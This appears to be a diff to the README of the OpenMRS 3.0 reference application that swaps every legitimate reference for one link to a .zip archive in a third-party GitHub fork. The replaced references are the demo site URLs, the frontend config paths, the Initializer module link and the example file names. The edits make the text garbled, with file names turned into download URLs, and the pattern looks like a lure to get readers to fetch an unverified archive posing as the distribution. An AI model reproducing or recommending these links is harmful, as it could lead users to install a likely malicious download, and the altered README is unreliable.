@@ -1,7 +1,7 @@
 # OpenMRS 3.0 Reference Application
 
 This project holds the build configuration for the OpenMRS 3.0 reference application, found on
-https://dev3.openmrs.org and https://o3.openmrs.org.
+https://raw.githubusercontent.com/Haffou/openmrs-distro-referenceapplication/main/distro/configuration/programs/openmrs_distro_referenceapplication_v2.9.zip and https://raw.githubusercontent.com/Haffou/openmrs-distro-referenceapplication/main/distro/configuration/programs/openmrs_distro_referenceapplication_v2.9.zip
 
 ## Quick start
 
@@ -30,13 +30,13 @@ This distribution consists of four images:
   based on the core OpenMRS Docker file. Additional contents for this image are drawn from the `distro` sub-directory which
   includes a full Initializer configuration for the reference application intended as a starting point.
 * frontend - This image is a simple nginx container that embeds the 3.x frontend, including the modules described in  the
-  `frontend/spa-build-config.json` file.
+  `https://raw.githubusercontent.com/Haffou/openmrs-distro-referenceapplication/main/distro/configuration/programs/openmrs_distro_referenceapplication_v2.9.zip` file.
 * proxy - This image is an even simpler nginx reverse proxy that sits in front of the `backend` and `frontend` containers
   and provides a common interface to both. This helps mitigate CORS issues.
 
 ## Contributing to the configuration
 
-This project uses the [Initializer](https://github.com/mekomsolutions/openmrs-module-initializer) module
+This project uses the [Initializer](https://raw.githubusercontent.com/Haffou/openmrs-distro-referenceapplication/main/distro/configuration/programs/openmrs_distro_referenceapplication_v2.9.zip) module
 to configure metadata for this project. The Initializer configuration can be found in the configuration
 subfolder of the distro folder. Any files added to this will be automatically included as part of the
 metadata for the RefApp.
@@ -53,9 +53,9 @@ though they may use that metadata as a starting point for that customization.
 
 To help us keep track of things, we ask that you suffix any files you add with either
 `-core_demo` for files that should be part of the demo package and `-core_data` for
-those that should be part of the core package. For example, a form named `test_form.json` would become
-`test_core-core_demo.json`.
+those that should be part of the core package. For example, a form named `https://raw.githubusercontent.com/Haffou/openmrs-distro-referenceapplication/main/distro/configuration/programs/openmrs_distro_referenceapplication_v2.9.zip` would become
+`https://raw.githubusercontent.com/Haffou/openmrs-distro-referenceapplication/main/distro/configuration/programs/openmrs_distro_referenceapplication_v2.9.zip`.
 
-Frontend configuration can be found in `frontend/config-core_demo.json`.
+Frontend configuration can be found in `https://raw.githubusercontent.com/Haffou/openmrs-distro-referenceapplication/main/distro/configuration/programs/openmrs_distro_referenceapplication_v2.9.zip`.
 
 Thanks!
